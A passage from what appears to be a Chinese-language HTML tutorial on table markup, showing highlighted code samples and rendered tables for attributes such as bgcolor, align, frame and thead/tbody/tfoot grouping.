punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1" cellspacing="20"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><h3 id="表格-单元格背景"><a href="#表格-单元格背景" class="headerlink" title="表格/单元格背景"></a>表格/单元格背景</h3><p>背景颜色<code>bgcolor</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>yellow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1" bgcolor="yellow"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><p>背景图像<code>background</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>FrontEnd_HTML_Basic/html5.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1" background="FrontEnd_HTML_Basic/html5.jpg"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><p>单元格背景同理，加在相应的<code>td</code>标签里即可。例如：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>blue<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1"><tbody><tr>  <td bgcolor="blue">First</td>  <td>Row</td></tr>   </tbody></table><h3 id="排列内容"><a href="#排列内容" class="headerlink" title="排列内容"></a>排列内容</h3><p><code>align</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>400<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>消费项目....<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>一月<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>二月<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>衣服<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$241.10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$50.20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>食物<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$730.40<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$650.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>总计<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$1001.50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$744.65<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table width="400" border="1"> <tbody><tr>  <th align="center">消费项目....</th>  <th align="center">一月</th>  <th align="center">二月</th> </tr> <tr>  <td align="left">衣服</td>  <td align="right">$241.10</td>  <td align="right">$50.20</td> </tr> <tr>  <td align="left">食物</td>  <td align="right">$730.40</td>  <td align="right">$650.00</td> </tr> <tr>  <th align="left">总计</th>  <th align="right">$1001.50</th>  <th align="right">$744.65</th> </tr></tbody></table><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p><code>frame</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Table with frame="box":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Table with frame="above":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>above<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Table with frame="below":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>below<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Table with frame="hsides":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hsides<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Table with frame="vsides":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>vsides<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><p>Table with frame="box":</p><table frame="box">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="above":</p><table frame="above">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="below":</p><table frame="below">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="hsides":</p><table frame="hsides">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="vsides":</p><table frame="vsides">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><h3 id="行分组"><a href="#行分组" class="headerlink" title="行分组"></a>行分组</h3><p><code>thead</code> 元素应该与 <code>tbody</code> 和 <code>tfoot</code> 元素结合起来使用。（但很少使用这三个元素）</p><p><code>tbody</code> 元素用于对 HTML 表格中的主体内容进行分组，而 <code>tfoot</code> 元素用于对 HTML 表格中的表注（页脚）内容进行分组。</p><blockquote><p>thead、tfoot 以及 tbody  元素使您有能力对表格中的行进行分组。当您创建某个表格时，您也许希望拥有一个标题行，一些带有数据的行，以及位于底部的一个总计行。这种划分使浏览器有能力支持独立于表格标题和页脚的表格正文滚动。当长的表格被打印时，表格的表头和页脚可被打印在包含表格数据的每张页面上。</p></blockquote><p><code>&lt;thead&gt;</code> 内部必须拥有<code>&lt;tr&gt;</code> 标签！</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thead</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>green</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>thead</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>blue<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span><span class="token number">50</span>px</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>February<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$80<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tfoot</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Sum<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$180<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tfoot</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1">  <thead style="color:green">    <tr>      <th>Month</th>      <th>Savings</th>    </tr>  </thead>  <tbody style="color:blue;height:50px">    <tr>      <td>January</td>      <td>$100</td>    </tr>    <tr>      <td>February</td>      <td>$80</td>    </tr>  </tbody>  <tfoot style="color:red">    <tr>      <td>Sum</td>      <td>$180</td>    </tr>  </tfoot></table><h3 id="列分组"><a href="#列分组" class="headerlink" title="列分组"></a>列分组</h3><p><code>col</code>标签为表格中一个或多个列定义属性值。</p><p><code>col</code> 元素是仅包含属性的空元素。如需创建列，您就必须在 <code>tr</code> 元素内部规定 <code>td</code> 元素。</p><p>例如为表格中的三个列规定了不同的对齐方式：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span> <span class="token 